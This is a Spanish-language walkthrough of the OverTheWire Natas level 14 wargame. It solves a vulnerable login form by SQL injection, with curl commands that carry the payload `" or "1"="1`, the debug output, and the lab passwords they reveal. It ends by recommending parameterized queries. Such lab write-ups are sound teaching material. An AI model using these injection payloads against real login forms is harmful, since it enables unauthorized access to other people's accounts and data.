# Natas Level14

## Descripción
> **Level Goal (natas14.natas.labs.overthewire.org):** Un formulario de login (usuario/contraseña) construye una consulta SQL concatenando directamente ambos campos: `SELECT * from users where username="..." and password="..."`.

## Solución
Inyección SQL clásica. El primer intento con `" or "1"="1` solo en el usuario falla porque `AND` tiene más precedencia que `OR` en SQL: la condición queda como `username="" or ("1"="1" and password="x")`, que es falsa si la contraseña no coincide. Hay que inyectar la condición `OR "1"="1` en **ambos** campos para que cualquiera de los dos baste.

```bash
# con &debug=1 se puede ver la query real que arma el servidor
curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 \
  "http://natas14.natas.labs.overthewire.org/index.php?debug=1" \
  --data-urlencode 'username=" or "1"="1' \
  --data-urlencode "password=x"
# Executing query: SELECT * from users where username="" or "1"="1" and password="x"
# Access denied!   <- por la precedencia de AND/OR

curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 \
  --data-urlencode 'username=" or "1"="1' \
  --data-urlencode 'password=" or "1"="1' \
  http://natas14.natas.labs.overthewire.org/index.php
# Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
```

## Notas adicionales
- El parámetro de depuración `?debug=1` de la propia aplicación resultó muy útil para ver la consulta SQL exacta y entender por qué el primer intento fallaba — buena práctica: cuando algo no funciona como se espera, buscar cualquier forma de "ver" el paso intermedio antes de seguir adivinando.
- La causa raíz sigue siendo la misma en todos los niveles de inyección SQL: concatenar entrada de usuario directamente en una consulta en vez de usar *prepared statements*/consultas parametrizadas.

## Referencias
- Reto original: http://natas14.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/attacks/SQL_Injection (OWASP, SQL Injection)
